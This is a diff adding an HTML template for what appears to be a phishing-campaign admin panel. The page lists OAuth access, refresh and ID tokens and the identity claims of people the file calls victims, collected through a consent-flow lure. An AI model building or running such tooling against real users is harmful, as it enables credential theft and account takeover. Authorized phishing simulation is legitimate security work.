@@ -1,0 +1,231 @@
+{% extends "base.html" %}
+{% block content %}
+<div class="max-w-6xl mx-auto py-8">
+
+  <!-- Navigation Back Link -->
+  <div class="mb-6 font-mono-brutal">
+    <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="inline-flex items-center text-xs font-bold text-gray-700 dark:text-gray-300 hover:text-pure-black dark:hover:text-stark-white transition-colors">
+      <svg class="w-4 h-4 mr-1.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M15 19l-7-7 7-7"/></svg>
+      [ BACK TO CAMPAIGN INFO ]
+    </a>
+  </div>
+  <div class="flex items-center justify-between mb-6">
+    <h1 class="text-3xl font-extrabold font-mono-brutal">CAPTURED OAUTH TOKENS</h1>
+    <div class="flex gap-3">
+      <a href="{{ url_for('campaigns_admin.admin_oauth_config', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">OAUTH CONFIG</a>
+      <a href="{{ url_for('campaigns_admin.admin_campaign_info', cid=campaign.id) }}" class="brutal-btn-white px-4 py-2 text-sm">CAMPAIGN INFO</a>
+    </div>
+  </div>
+
+  <div class="brutal-card p-6 mb-6">
+    <h2 class="text-xl font-bold font-mono-brutal mb-2">{{ campaign.name }}</h2>
+    <p class="text-sm font-mono-brutal text-gray-600 dark:text-gray-400">
+      OAuth2 authorization codes and tokens captured from campaign recipients.
+      {% if tokens %}{{ tokens | length }} token(s) captured.{% endif %}
+    </p>
+  </div>
+
+  {% if tokens %}
+  <div class="brutal-card p-6 mb-6">
+    <h3 class="text-lg font-bold font-mono-brutal mb-4">Summary</h3>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">TOTAL CAPTURED</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ tokens | length }}</div>
+      </div>
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">WITH ACCESS TOKEN</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ tokens | selectattr('access_token') | list | length }}</div>
+      </div>
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">WITH ID TOKEN</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ tokens | selectattr('id_token') | list | length }}</div>
+      </div>
+      <div class="border-2 border-pure-black dark:border-stark-white p-3">
+        <div class="font-mono-brutal text-xs text-gray-500">UNIQUE RECIPIENTS</div>
+        <div class="font-mono-brutal text-2xl font-extrabold">{{ tokens | map(attribute='recipient_token') | unique | list | length }}</div>
+      </div>
+    </div>
+  </div>
+
+  {% for t in tokens %}
+  {% set claims = t.parsed_id_token_claims() if t.id_token else {} %}
+  <div class="brutal-card p-6 mb-4">
+    <div class="flex items-center justify-between mb-3">
+      <div class="font-mono-brutal font-bold">
+        #{{ t.id }}
+        <span class="text-gray-500 text-sm ml-2">{{ t.captured_at.strftime('%Y-%m-%d %H:%M:%S') if t.captured_at else '-' }}</span>
+      </div>
+      <div class="flex items-center gap-2">
+        <span class="font-mono-brutal text-xs px-2 py-1 border-2 border-pure-black dark:border-stark-white">
+          {{ t.provider or 'unknown' | upper }}
+        </span>
+        {% if t.access_token %}
+          <span class="font-mono-brutal text-xs px-2 py-1 border-2 border-brutal-emerald text-brutal-emerald">ACCESS</span>
+        {% endif %}
+        {% if t.id_token %}
+          <span class="font-mono-brutal text-xs px-2 py-1 border-2 border-brutal-amber text-brutal-amber">ID_TOKEN</span>
+        {% endif %}
+        {% if t.refresh_token %}
+          <span class="font-mono-brutal text-xs px-2 py-1 border-2 border-brutal-red text-brutal-red">REFRESH</span>
+        {% endif %}
+      </div>
+    </div>
+
+    <!-- Identity Claims (rich viewer) -->
+    {% if claims %}
+    <div class="mb-4 p-4 border-2 border-brutal-emerald bg-off-white dark:bg-black">
+      <div class="font-mono-brutal text-xs font-bold text-brutal-emerald mb-3 uppercase">&#x1f464; Identity Claims</div>
+      <div class="grid grid-cols-1 md:grid-cols-2 gap-3">
+        {% if claims.get('sub') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">SUBJECT</div>
+          <div class="font-mono-brutal text-sm font-bold break-all">{{ claims.sub }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('email') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">EMAIL</div>
+          <div class="font-mono-brutal text-sm font-bold break-all">{{ claims.email }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('name') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">NAME</div>
+          <div class="font-mono-brutal text-sm font-bold">{{ claims.name }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('preferred_username') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">USERNAME</div>
+          <div class="font-mono-brutal text-sm font-bold">{{ claims.preferred_username }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('iss') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">ISSUER</div>
+          <div class="font-mono-brutal text-sm font-bold break-all">{{ claims.iss }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('aud') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">AUDIENCE</div>
+          <div class="font-mono-brutal text-sm font-bold break-all">{{ claims.aud }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('exp') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">EXPIRES</div>
+          <div class="font-mono-brutal text-sm font-bold">{{ claims.exp }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('iat') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">ISSUED_AT</div>
+          <div class="font-mono-brutal text-sm font-bold">{{ claims.iat }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('nonce') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">NONCE</div>
+          <div class="font-mono-brutal text-sm font-bold break-all">{{ claims.nonce }}</div>
+        </div>
+        {% endif %}
+        {% if claims.get('at_hash') %}
+        <div>
+          <div class="font-mono-brutal text-xs text-gray-500">AT_HASH</div>
+          <div class="font-mono-brutal text-sm font-bold break-all">{{ claims.at_hash }}</div>
+        </div>
+        {% endif %}
+      </div>
+      <!-- Additional claims -->
+      {% set known_keys = ['sub', 'email', 'name', 'preferred_username', 'iss', 'aud', 'exp', 'iat', 'nonce', 'at_hash'] %}
+      {% set extra_claims = {} %}
+      {% for k, v in claims.items() %}
+        {% if k not in known_keys %}
+          {% set _ = extra_claims.update({k: v}) %}
+        {% endif %}
+      {% endfor %}
+      {% if extra_claims %}
+      <div class="mt-3 pt-3 border-t border-gray-300 dark:border-gray-700">
+        <div class="font-mono-brutal text-xs text-gray-500 mb-2">ADDITIONAL CLAIMS</div>
+        <div class="grid grid-cols-1 md:grid-cols-2 gap-2">
+          {% for k, v in extra_claims.items() %}
+          <div class="flex gap-2">
+            <span class="font-mono-brutal text-xs font-bold text-gray-500 whitespace-nowrap">{{ k }}:</span>
+            <span class="font-mono-brutal text-xs break-all">{{ v }}</span>
+          </div>
+          {% endfor %}
+        </div>
+      </div>
+      {% endif %}
+    </div>
+    {% endif %}
+
+    <!-- Token details grid -->
+    <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-sm font-mono-brutal mb-3">
+      <div>
+        <span class="text-gray-500">Recipient Token:</span>
+        <span class="break-all">{{ t.recipient_token or '-' }}</span>
+      </div>
+      <div>
+        <span class="text-gray-500">Scope:</span>
+        <span>{{ t.scope or '-' }}</span>
+      </div>
+      <div>
+        <span class="text-gray-500">Token Type:</span>
+        <span>{{ t.token_type or '-' }}</span>
+      </div>
+      <div>
+        <span class="text-gray-500">Expires In:</span>
+        <span>{{ t.expires_in ~ 's' if t.expires_in else '-' }}</span>
+      </div>
+    </div>
+
+    {% if t.access_token %}
+    <div class="mt-3">
+      <button onclick="this.nextElementSibling.classList.toggle('hidden')" class="font-mono-brutal text-xs font-bold text-gray-500 mb-1 hover:text-brutal-red transition-colors">
+        &#x1f511; ACCESS TOKEN &#x25BC;
+      </button>
+      <div class="hidden bg-off-white dark:bg-black p-2 border-2 border-gray-300 dark:border-gray-700 break-all text-xs font-mono max-h-20 overflow-y-auto">{{ t.access_token }}</div>
+    </div>
+    {% endif %}
+
+    {% if t.refresh_token %}
+    <div class="mt-3">
+      <button onclick="this.nextElementSibling.classList.toggle('hidden')" class="font-mono-brutal text-xs font-bold text-gray-500 mb-1 hover:text-brutal-red transition-colors">
+        &#x1f504; REFRESH TOKEN &#x25BC;
+      </button>
+      <div class="hidden bg-off-white dark:bg-black p-2 border-2 border-gray-300 dark:border-gray-700 break-all text-xs font-mono max-h-20 overflow-y-auto">{{ t.refresh_token }}</div>
+    </div>
+    {% endif %}
+
+    {% if t.id_token %}
+    <div class="mt-3">
+      <button onclick="this.nextElementSibling.classList.toggle('hidden')" class="font-mono-brutal text-xs font-bold text-gray-500 mb-1 hover:text-brutal-red transition-colors">
+        &#x1f4dc; RAW ID TOKEN &#x25BC;
+      </button>
+      <div class="hidden bg-off-white dark:bg-black p-2 border-2 border-gray-300 dark:border-gray-700 break-all text-xs font-mono max-h-20 overflow-y-auto">{{ t.id_token }}</div>
+    </div>
+    {% endif %}
+
+    {% if t.id_token %}
+    <div class="mt-3">
+      <button onclick="this.nextElementSibling.classList.toggle('hidden')" class="font-mono-brutal text-xs font-bold text-gray-500 mb-1 hover:text-brutal-red transition-colors">
+        &#x1f4cb; FULL CLAIMS JSON &#x25BC;
+      </button>
+      <pre class="hidden bg-off-white dark:bg-black p-3 border-2 border-gray-300 dark:border-gray-700 text-xs font-mono max-h-48 overflow-y-auto">{{ claims | tojson(indent=2) }}</pre>
+    </div>
+    {% endif %}
+  </div>
+  {% endfor %}
+
+  {% else %}
+  <div class="brutal-card p-6">
+    <p class="font-mono-brutal text-gray-500 dark:text-gray-400 text-center py-8">
+      No OAuth tokens captured yet. Tokens will appear here when victims complete the OAuth consent flow.
+    </p>
+  </div>
+  {% endif %}
+</div>
+{% endblock %}
